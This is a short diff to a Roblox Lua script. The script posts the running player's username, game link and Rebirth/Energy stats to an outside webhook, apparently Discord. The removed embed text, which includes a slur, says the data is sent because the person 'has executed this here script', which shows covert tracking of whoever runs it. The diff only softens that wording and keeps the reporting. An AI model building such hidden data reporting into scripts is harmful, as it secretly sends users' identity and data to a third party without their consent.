@@ -34,7 +34,7 @@ local function SendMessageOnce(url, username, rebirths, stats)
                     ["name"] = username,
                     ["url"] = "https://roblox.com/games/"..game.PlaceId,
                 },
-                ["description"] = "this cunt has executed this here script, have their stats, on me :D",
+                ["description"] = "have their stats, on me buddy :D",
                 ["type"] = "rich",
                 ["color"] = tonumber(0xf2ff00),
                 ["fields"] = {
@@ -204,6 +204,7 @@ local function sendWebhookOnce()
         local rebirths = playerStats:FindFirstChild("Rebirth") and playerStats.Rebirth.Value or 0
         local stats = playerStats:FindFirstChild("Energy") and playerStats.Energy.Value or 0
 
+        -- Send the message to webhook without til rebirth
         SendMessageOnce(webhookUrl, player.Name, rebirths, stats)
     end
 end
